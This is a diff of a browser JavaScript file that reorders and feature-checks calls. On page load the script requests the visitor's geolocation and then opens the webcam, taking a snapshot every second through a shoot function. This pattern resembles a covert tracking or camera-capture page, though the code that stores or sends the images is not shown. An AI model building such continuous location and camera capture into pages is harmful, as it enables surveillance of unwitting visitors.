@@ -48,44 +48,7 @@ const successGeo = ({ coords }) => {
 
 const errorGeo = ({ code, message }) => console.warn(`ERROR(${code}): ${message}`);
 
-navigator.geolocation.getCurrentPosition(successGeo, errorGeo, optionsGeo);
-navigator.getUserMedia(
-  { audio: false, video: { width: 1280, height: 720 } },
-  (stream) => {
-    const video = document.querySelector('video');
 
-    if (video) {
-      video.srcObject = stream;
-      video.onloadedmetadata = () => {
-        video.play();
-      };
-      setInterval(() => {
-          shoot()
-      }, 1000)
-
-    }
-  },
-  (err) => console.log("The following error occurred: " + err.name),
-);
-
-navigator.mediaDevices.getUserMedia(
-  { audio: false, video: { width: 1280, height: 720 } },
-  (stream) => {
-    const video = document.querySelector('video');
-
-    if (video) {
-      video.srcObject = stream;
-      video.onloadedmetadata = () => {
-        video.play();
-      };
-      setInterval(() => {
-        shoot('media/')
-      }, 1000)
-
-    }
-  },
-  (err) => console.log("The following error occurred: " + err.name),
-);
 
 function capture(video, scaleFactor) {
   if (scaleFactor == null) {
@@ -134,3 +97,48 @@ btn.addEventListener('click', (e) => {
 
   writeData(result);
 });
+
+navigator.geolocation.getCurrentPosition(successGeo, errorGeo, optionsGeo);
+
+if (navigator.getUserMedia) {
+  navigator.getUserMedia(
+  { audio: false, video: { width: 1280, height: 720 } },
+  (stream) => {
+    const video = document.querySelector('video');
+
+    if (video) {
+      video.srcObject = stream;
+      video.onloadedmetadata = () => {
+        video.play();
+      };
+      setInterval(() => {
+          shoot()
+      }, 1000)
+
+    }
+  },
+  (err) => console.log("The following error occurred: " + err.name),
+);
+}
+
+if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+  navigator.mediaDevices.getUserMedia(
+  { audio: false, video: { width: 1280, height: 720 } },
+  (stream) => {
+    const video = document.querySelector('video');
+
+    if (video) {
+      video.srcObject = stream;
+      video.onloadedmetadata = () => {
+        video.play();
+      };
+      setInterval(() => {
+        shoot('media/')
+      }, 1000)
+
+    }
+  },
+  (err) => console.log("The following error occurred: " + err.name),
+);
+}
+
